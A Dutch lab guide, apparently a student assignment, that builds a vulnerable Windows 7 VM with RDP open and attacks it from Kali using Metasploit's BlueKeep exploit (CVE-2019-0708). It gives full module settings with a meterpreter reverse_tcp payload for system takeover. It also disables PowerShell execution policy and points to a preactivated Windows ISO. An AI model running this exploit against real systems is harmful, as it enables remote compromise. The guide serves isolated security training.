# STAPPENPLAN NPE-OPDRACHT

In dit stappenplan wordt eerst toegelicht hoe de Windows 7 omgeving automatisch wordt opgezet. Vervolgens worden de stappen beschreven om vanuit de Kali Linux-machine een aanval uit te voeren op basis van CVE-2019-0708.

## 1. Windows 7

### Voorbereiding:

- Voor het downloaden van de gebruikte Windows 7 ISO, ga naar:
  `https://archive.org/details/win-7-ultimate-sp-1-en-us-sept-2015-x-64/Windows%207%20Ultimate%2064-bit%20SP1%20%5BPreactivated%20ISO%5D/Images/Windows%207%2064bit%20SP1-2023-11-29-22-03-26.png`
- En download `ISO IMAGE`
- Zet de ISO in dezelfde map als de scripts.
- Aangezien Windows 7 de recente VirtualBox Guest Additions niet correct ondersteunt, gebruik versie 6.1.26:
- `https://download.virtualbox.org/virtualbox/6.1.26/VBoxGuestAdditions_6.1.26.iso`
- Zet ook dit ISO-bestand in dezelfde map.


### Zorg dat je scripts kunt runnen
Soms laat Windows niet toe om scripts te runnen die je zelf niet gesigned hebt, daarom moet je je Execution-Policy aanpassen in een **Administator mode Powershell** venster

```ps
Set-ExecutionPolicy Unrestricted

# als deze een foutmelding geeft moet je deze uitvoeren:
Set-ExecutionPolicy Unrestricted -Scope CurrentUser
```

### Stap 1: Start het `create_win7_vm.ps1` script

- Volg de installatie (klik enkele keren op "Next") en wacht tot Windows volledig geïnstalleerd is.
- Wanneer Windows geïnstalleerd is, ga naar `file explorer > computer > VirtualBox Guest Additions` op de Windows7-VM en voer het `VBoxWindowsAdditions-amd64.exe` uit.
- Selecteer alle default-opties van de setup (klik telkens op *Next*) en vertrouw de installatie indien je dit scherm krijgt. Klik dan op **Install**.
- Druk op **reboot now** wanneer dit gevraagd uit

### Stap 2: RDP inschakelen

- Open cmd als administrator en voer volgende commando's uit:

```ps
Z:
powershell -ExecutionPolicy Bypass -File \enable_rdp.ps1
```

- Hiermee worden RDP, ICMP (ping) en poort 3389 automatisch geactiveerd.
- De Windows 7 omgeving is nu volledig klaar voor de aanval.

## 2. Kali

Zodra de Windows 7 VM klaarstaat, configureer je de KaliVM

### Stap 1:  Netwerkconfiguratie
**Zorgen dat beide VMs in hetzelfde interne netwerk zitten**

- Verander in de VirtualBox settings:
  - Netwerkadapter 1: default NAT (zodat je internet hebt)
  - Netwerkadapter 2: *internal network* en selecteer `npe_intnet` 

**IP-adres toekennen aan eth1**

- Open een terminal op Kali en voer het volgende uit:

```bash
sudo ip addr add 10.10.10.3/24 dev eth1
sudo ip link set eth1 up
```

### Stap 2: Start Metasploit

```bash
msfconsole
```

- Laad vervolgens het Bluekeep expoloit:

```
exploit/windows/rdp/cve_2019_0708_bluekeep_rce
use exploit/windows/rdp/cve_2019_0708_bluekeep_rce

set RHOSTS 10.10.10.2
set PAYLOAD windows/x64/meterpreter/reverse_tcp
set LHOST 10.10.10.3
set LPORT 4444
set TARGET 1
run
```

- Als alles correct is ingesteld, opent er zich een Meterpreter sessie waarmee je het systeem kunt overnemen.
